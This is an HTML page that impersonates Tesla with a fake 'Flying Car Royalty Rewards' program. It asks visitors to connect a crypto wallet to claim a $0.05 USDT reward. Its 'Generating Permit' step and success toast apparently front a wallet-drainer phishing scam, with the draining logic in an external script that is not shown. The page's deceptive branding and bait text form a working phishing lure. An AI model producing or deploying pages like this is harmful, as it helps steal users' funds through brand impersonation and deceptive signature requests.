<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Flying Car Royalty Program</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f5f5f5; }
        .tesla-red { color: #e82127; }
        .btn-primary { background-color: #e82127; transition: all 0.3s ease; }
        .btn-primary:hover { background-color: #c91b20; }
        .hidden { display: none; }
        .toast { animation: slideIn 0.5s ease-out; }
        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen bg-gray-50">
    <div class="w-full max-w-md p-8 bg-white shadow-xl rounded-xl text-center">
        <header>
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="h-16 mx-auto mb-4">
            <h1 class="text-2xl font-light tracking-tight">Flying Car Royalty Rewards</h1>
            <p class="mt-2 text-sm text-gray-500">Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
        </header>

        <main id="main-content" class="mt-8">
            <!-- Step 1: Connect -->
            <div id="connect-step">
                <button id="connect-btn" class="btn-primary w-full py-3 px-4 rounded-lg text-white font-semibold text-lg shadow-md">
                    Connect Wallet
                </button>
                <div id="loader" class="hidden mt-4 text-gray-500 animate-pulse">Verifying Network & Generating Permit...</div>
            </div>

            <!-- Step 2: Dashboard -->
            <div id="reward-section" class="hidden">
                <div class="bg-gray-50 p-4 rounded-lg border border-gray-200 text-left mb-4">
                    <div class="flex justify-between mb-2">
                        <span class="text-sm text-gray-500">Address:</span>
                        <span id="user-address" class="mono text-xs break-all">0x000...000</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-sm text-gray-500">Status:</span>
                        <span id="reward-status" class="font-medium text-blue-600">Pending Approval</span>
                    </div>
                </div>
                
                <!-- Notification Toast -->
                <div id="notification" class="hidden toast bg-green-50 border border-green-200 rounded-lg p-3 mb-4 flex items-center gap-3">
                    <div class="text-green-500 text-xl">✓</div>
                    <div class="text-green-800 text-sm font-medium">Reward Claimed! $0.05 USDT sent to your wallet.</div>
                </div>
            </div>
        </main>
    </div>
    
    <!-- Main Logic -->
    <script type="module" src="/app.js"></script>
</body>
</html>
